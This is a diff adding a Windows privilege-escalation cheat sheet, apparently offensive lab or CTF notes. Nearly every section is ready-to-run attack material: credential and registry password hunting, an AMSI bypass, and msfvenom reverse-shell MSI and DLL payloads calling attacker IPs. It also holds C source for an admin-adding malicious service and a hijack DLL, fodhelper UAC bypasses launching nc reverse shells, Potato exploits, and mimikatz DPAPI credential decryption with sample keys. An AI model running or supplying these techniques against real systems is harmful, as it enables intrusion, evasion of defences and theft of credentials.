@@ -1,0 +1,389 @@
+-----------
+Enumeration
+-----------
+whoami 
+whoami /priv
+whoami /groups
+whoami /all
+
+get-hotfix | ft -autosize
+gci \\.\pipe\
+
+net user 
+net user omar
+net localgroup administrators
+
+ipconfig
+ipconfig /all 
+arp -a
+route print
+
+netstat -ano
+
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+hostname
+
+wmic qfe
+wmic qfe get caption,description,hotfixid,installedon
+wmic logicaldisk
+wmic logicaldisk get caption,description,providername
+
+findstr /si pass *
+Get-ChildItem -Path . -Recurse -ErrorAction SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg, *.bat |  Select-String -Pattern "pass" 
+
+dir . /s
+where /R c:\windows bash.exe
+
+sc query WinDefend
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*Exclusions\Paths*" } | Select-Object -Property TimeCreated, Id, Message | Format-List
+sc queryex type=service
+
+netsh firewall show stat
+netsh firewall show config
+ 
+Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
+
+cmdkey /list
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*$env:USERNAME*"}
+Get-CimInstance Win32_Service | Where-Object { $_.StartName -like "*$env:USERNAME*" }
+tasklist /v | findstr /i "administrator"
+ 
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+dir "$env:APPDATA" -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem Env:
+Get-Clipboard
+
+accesschk.exe /accepteula -uwds omar C:\Windows
+icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  
+. .\powerup.ps1
+invoke-allchecks
+
+. .\privesc.ps1
+invoke-privesc
+
+winpeas.ps1
+
+wes.py --update    
+wes.py $(pwd)/systeminfo.txt 
+
+-----------
+AMSI bypass
+-----------
+$amsi = [AppDomain]::CurrentDomain.GetAssemblies() |
+Where-Object { $_.FullName -like "*Management.Automation*" } |
+ForEach-Object { $_.GetType("System.Management.Automation.AmsiUtils") }
+$field = $amsi.GetField("amsiInitFailed", "NonPublic,Static")
+$field.SetValue($null, $true)
+
+------------------
+Escalation via WSL
+------------------
+where /R c:\windows bash.exe
+where /R c:\windows wsl.exe
+
+wsl.exe whoami
+bash.exe => shell
+
+-----------------------
+Escalation via autoruns
+-----------------------
+autorunsc.exe
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+icacls "C:\Program Files\Autorun Program\program.exe"
+
+------------------------------------
+Escalation via AlwaysInstallElevated 
+------------------------------------
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer 
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer 
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.6.3.68 lport=5555 -f msi -o setup.msi
+
+msiexec /quiet /qn /i setup.msi
+
+-------------------------------
+Escalation via Registry service
+-------------------------------
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+----------
+#include <windows.h>
+#include <stdio.h>
+#define SLEEP_TIME 5000
+
+SERVICE_STATUS ServiceStatus; 
+SERVICE_STATUS_HANDLE hStatus; 
+ 
+void ServiceMain(int argc, char** argv); 
+void ControlHandler(DWORD request); 
+
+int Run() 
+{ 
+    system("cmd.exe /k net localgroup administrators user /add");
+    return 0; 
+} 
+
+int main() 
+{ 
+    SERVICE_TABLE_ENTRY ServiceTable[2];
+    ServiceTable[0].lpServiceName = "MyService";
+    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    ServiceTable[1].lpServiceName = NULL;
+    ServiceTable[1].lpServiceProc = NULL;
+ 
+    StartServiceCtrlDispatcher(ServiceTable);  
+    return 0;
+}
+
+void ServiceMain(int argc, char** argv) 
+{ 
+    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode      = 0; 
+    ServiceStatus.dwServiceSpecificExitCode = 0; 
+    ServiceStatus.dwCheckPoint         = 0; 
+    ServiceStatus.dwWaitHint           = 0; 
+ 
+    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
+    Run(); 
+    
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+    SetServiceStatus (hStatus, &ServiceStatus);
+ 
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+                Sleep(SLEEP_TIME);
+    }
+    return; 
+}
+
+void ControlHandler(DWORD request) 
+{ 
+    switch(request) 
+    { 
+        case SERVICE_CONTROL_STOP: 
+                        ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+ 
+        case SERVICE_CONTROL_SHUTDOWN: 
+            ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+        
+        default:
+            break;
+    } 
+    SetServiceStatus (hStatus,  &ServiceStatus);
+    return; 
+} 
+----------
+
+x86_64-w64-mingw32-gcc service.c -o service.exe
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f 
+
+sc start regsvc
+
+----------------------------
+Escalation via DLL hijacking
+----------------------------
+Get-ChildItem C:\ -Recurse -Filter *.dll -ErrorAction SilentlyContinue |
+ForEach-Object {
+    $acl = Get-Acl $_.FullName
+    foreach ($ace in $acl.Access) {
+        if (
+            $ace.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -and
+            ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) -ne 0 -and
+            $ace.AccessControlType -eq 'Allow'
+        ) {
+            $_.FullName
+        }
+    }
+}
+
+
+Get-ChildItem C:\ -Recurse -Filter *.dll -ErrorAction SilentlyContinue | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -and $_.FileSystemRights -band 'Write' -and $_.AccessControlType -eq 'Allow' } } | Select-Object FullName > dlls.txt
+ 
+
+.\listdlls.exe -accepteula > live_dlls.txt
+
+grep -Fxv -f live_dlls.txt dlls.txt 
+ 
+----------
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+----------
+
+----------------------------
+Escalation via COM Hijacking
+----------------------------
+reg query HKCR\CLSID /s /f "7-zip"
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.16.89 LPORT=4444 -f dll -o hack.dll
+reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\ProgramData\hack.dll" /f
+nc -nlvp 4444
+ 
+----------------------
+Escalation via binpath
+----------------------
+accesschk64.exe -wuvc everyone *
+accesschk64.exe -wuvc daclsvc => SERVICE_CHANGE_CONFIG permission
+
+sc config daclsvc binpath= "net localgroup administrators user /add"
+sc start daclsvc
+
+----------------------------------
+Escalation via unquotedservicepath
+----------------------------------
+. .\powerup.ps1
+invoke-allchecks
+
+sc qc unquotedsvc
+C:\Program Files\Unquoted Path Service\common.exe =>  BINARY_PATH_NAME : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+sc start unquotedsvc
+
+------------------------
+Escalation via HotPotato
+------------------------
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" => Windows 7, Server 2008 R2, Server 2012, early Windows 10
+
+If MS16-075 or MS16-077 patches are missing → Hot Potato is probably still working :
+    =>	wmic qfe get HotFixID | findstr 075 	
+    =>	wmic qfe get HotFixID | findstr 077
+   
+Import-Module .\Tater.ps1
+Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add" 
+
+------------------------------
+Escalation via Scheduled Tasks
+------------------------------
+Get-ScheduledTask | Where-Object { $_.Principal.UserId -match "administrator" } | Select-Object TaskName, State, @{Name="RunAsUser";Expression={$_.Principal.UserId}}, @{Name="Action";Expression={$_.Actions.Execute + " " + $_.Actions.Arguments}}
+
+icacls c:\users\tcm\desktop\clean.ps1
+
+----------
+UAC Bypass
+----------
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+
+level 0 => Start-Process -FilePath "cmd.exe" -Verb RunAs -ArgumentList "/k", "powershell -ep bypass -windowstyle hidden -c `"ncat -nv 192.168.1.16 5 -e cmd.exe`""
+
+level 1,2,3,4 => if AlwaysInstallElevated we can create malicious .msi to get RevShell
+
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+   => msiexec /quiet /qn /i rev.msi
+   => msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.16 lport=4444 -f msi > rev.msi
+
+level 5 => fodhelper.exe
+   
+   => New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force
+   => Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'powershell -ep bypass -windowstyle hidden -c "c:\users\attacker\desktop\nc.exe -nv 10.6.3.68 4444 -e cmd.exe' -Type String
+   => Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String
+   => fodhelper.exe 
+   => reg delete HKCU\Software\Classes\ms-settings\ /f 
+   
+   ----------------------------------------------------------------------
+   * fodhelper.exe Bypassing windef
+   
+   => set CMD="powershell -windowstyle hidden -c c:\users\attacker\desktop\nc.exe -nv 10.6.3.68 4444 -e cmd.exe"    
+   => reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f 
+   => reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+   => fodhelper.exe
+   => reg delete "HKCU\Software\Classes\.thm\" /f
+   => reg delete "HKCU\Software\Classes\ms-settings\" /f
+
+* General Techniques 
+
+  => if rdp => run => msconfig => launch cmd from tools section
+  => if rdp => run => azman.msc => help => help topics => right click + view source => all files + c:\windows\system32\cmd.exe 
+  => Akagi32.exe (Automated Tool):
+     .\Akagi32.exe 61 "powershell -ep bypass -windowstyle hidden -c c:\users\attacker\desktop\nc.exe -nv 10.6.3.68 5555 -e cmd.exe"
+    
+-------------------------------------
+Escalation via SeImpersonatePrivilege
+-------------------------------------
+GodPotato :
+ 
+  => reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
+  => .\GodPotato-NET2.exe -c 'whoami'
+  => .\GodPotato-NET35.exe -c 'whoami'
+  => .\GodPotato-NET4.exe -c 'whoami'
+
+EfsPotato :
+  
+  => C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
+  => C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618
+  => ./EfsPotato.exe 'whoami'
+
+printspoofer :
+
+  => PrintSpoofer32.exe -I -c cmd
+
+RougePotato :
+
+  => sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.233.196:9999  
+  => C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe 
+  => C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 
+
+SweetPotato :
+  
+  => .\SweetPotato.exe -p cmd.exe
+
+-----------------
+DPAPI credentials
+-----------------
+
+* With users'password
+ 
+Master key :
+
+  => C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\
+  => dir -force
+  => e.g -> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
+  => cat masterkey.base64 | base64 -d > masterkey
+
+Credential files :
+
+  => C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
+  => dir -force
+  => e.g -> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))
+  => cat credential.base64 | base64 -d > credential
+
+dpapi.py masterkey -file masterkey -password 'Zer0the0ne' -sid S-1-5-21-4024337825-2033394866-2055507597-1115
+dpapi.py credential -file credential -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a 
+
+* Without user's password (mimikatz)
+
+e.g => .\mimikatz.exe "dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" exit
+e.g => .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit
+e.g => .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit  
+ 
